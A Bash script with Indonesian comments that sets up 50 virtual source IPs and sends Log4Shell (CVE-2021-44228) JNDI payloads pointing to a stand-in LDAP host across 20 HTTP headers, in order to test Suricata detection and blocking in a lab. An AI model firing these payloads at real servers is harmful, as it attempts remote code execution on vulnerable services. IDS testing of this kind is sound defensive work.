#!/usr/bin/env bash
# =============================================================================
#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_sim.sh [TARGET_IP] [TARGET_PORT]
#
#  Skrip ini membuat IP virtual di interface jaringan utama,
#  lalu menyerang server target menggunakan berbagai jenis serangan
#  dari IP yang berbeda-beda agar terlihat seperti serangan dari
#  banyak peretas sekaligus.
# =============================================================================

# ── Warna ────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Konfigurasi ───────────────────────────────────────────────────────────────
# Jika IP Ubuntu Server Anda berubah, edit IP di bawah ini!
TARGET_IP="192.168.216.128"
TARGET_PORT="80"
TARGET="http://${TARGET_IP}:${TARGET_PORT}"

# Deteksi interface jaringan utama secara otomatis
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
if [[ -z "$IFACE" ]]; then
    IFACE="eth0"
fi

# Ambil IP address dari interface tersebut (IP asli Kali)
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -n1)

# !! PENTING: Gunakan subnet BERBEDA dari jaringan lokal !!
# Agar Suricata mendeteksi sebagai EXTERNAL_NET (bukan HOME_NET)
# 10.66.66.x pasti bukan bagian dari 192.168.x.x lokal
IP_BASE="10.66.66"

# Range IP virtual yang akan dibuat (Contoh: 170.2.50.50 - 170.2.50.99)
IP_START=50
IP_COUNT=50

# Delay antar serangan (detik) — ubah ke 0 untuk serangan kilat
DELAY=0.5

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[OK]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${RED}[ERROR]${NC} Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1

# ── Cleanup saat EXIT ─────────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan IP virtual..."
    # Hapus route ke subnet 10.66.66.0/24 jika ada
    ip route del "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
    for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
        ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    done
    success "Semua IP virtual dihapus. Bersih!"
}
trap cleanup EXIT

# ─────────────────────────────────────────────────────────────────────────────
header "🔥 SURICATA ATTACK SIMULATOR"
echo -e "  Target    : ${BOLD}${TARGET}${NC}"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo -e "  IP Range  : ${BOLD}${IP_BASE}.${IP_START} - ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
echo -e "  Delay     : ${BOLD}${DELAY}s${NC}"
echo ""
warn "Pastikan IP target (${TARGET_IP}) TIDAK ada di Whitelist Dasbor agar bisa diblokir!"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

# ── Langkah 1: Buat IP Virtual ────────────────────────────────────────────────
header "1. Membuat IP Virtual"

# Siapkan file attackers.txt kosong
> attackers.txt
info "Mencatat IP penyerang ke attackers.txt"

for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
    ip addr add "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    echo "${IP_BASE}.${i}" >> attackers.txt
    success "IP virtual dibuat: ${IP_BASE}.${i}"
done

# Tambahkan route agar paket dari 10.66.66.x bisa dikirim ke TARGET_IP
# (Ubuntu Server perlu tahu bahwa 10.66.66.x bisa dijangkau via Kali)
info "Menambahkan route 10.66.66.0/24 ke interface ${IFACE}..."
ip route add "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true

# Tunggu sebentar agar routing stabil
sleep 1

# ── Langkah 2: Eksekusi Serangan ─────────────────────────────────────────────
header "2. Memulai Simulasi Serangan"

run_attack() {
    local src_ip="$1"
    local desc="$2"
    local url="$3"
    local extra_args="${4:-}"

    attack "${desc} dari ${BOLD}${src_ip}${NC}"
    curl -s --max-time 3 --interface "$src_ip" $extra_args "$url" -o /dev/null 2>/dev/null
    sleep "$DELAY"
}

# ── Daftar header Log4Shell yang berbeda-beda ─────────────────────────────────
# Suricata mendeteksi pola ${jndi: di berbagai header HTTP
HEADERS=(
    "X-Api-Version"
    "User-Agent"
    "X-Forwarded-For"
    "Referer"
    "X-Client-IP"
    "X-Real-IP"
    "Accept-Language"
    "Authorization"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Remote-Addr"
    "CF-Connecting-IP"
    "True-Client-IP"
    "X-Cluster-Client-IP"
    "Forwarded"
    "X-Forwarded-Host"
    "X-Host"
    "X-Original-URL"
    "X-Wap-Profile"
    "Contact"
)

PAYLOAD="\${jndi:ldap://evil.levi.com/exploit}"

echo ""
info "Menggunakan serangan Log4Shell (CVE-2021-44228)"
info "Payload dikirim via 20 header HTTP berbeda dari ${IP_COUNT} IP berbeda"
echo ""

for i in $(seq 0 $((IP_COUNT - 1))); do
    SRC_IP="${IP_BASE}.$((IP_START + i))"
    HDR_IDX=$((i % ${#HEADERS[@]}))
    HDR="${HEADERS[$HDR_IDX]}"

    attack "Log4Shell [${HDR}] dari ${BOLD}${SRC_IP}${NC}"
    curl -s --max-time 3 \
        --interface "$SRC_IP" \
        -H "${HDR}: ${PAYLOAD}" \
        "${TARGET}/" \
        -o /dev/null 2>/dev/null

    sleep "$DELAY"
done


# ── Ringkasan ─────────────────────────────────────────────────────────────────
header "✅ Simulasi Selesai!"

# Menghasilkan attack_metadata.json (Ground Truth Audit Trail)
info "Menyimpan attack_metadata.json..."
cat <<EOF > attack_metadata.json
{
  "test_date": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')",
  "attack_type": "Log4Shell via 20 HTTP Headers",
  "total_attackers": ${IP_COUNT},
  "target_ip": "${TARGET_IP}",
  "suricataeve_version": "1.0",
  "suricata_version": "7.0.x"
}
EOF
success "Metadata eksperimen disimpan!"

echo -e "  ${BOLD}${IP_COUNT} serangan${NC} dari ${BOLD}${IP_COUNT} IP berbeda${NC} telah diluncurkan!"
echo ""
echo -e "  ${GREEN}➜${NC} Buka Dasbor: ${BOLD}http://${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "  ${GREEN}➜${NC} Lihat IP mana yang berhasil diblokir di tabel ${BOLD}IP Diblok${NC}"
echo -e "  ${GREEN}➜${NC} Cek notifikasi di Discord/Webhook-mu"
echo ""
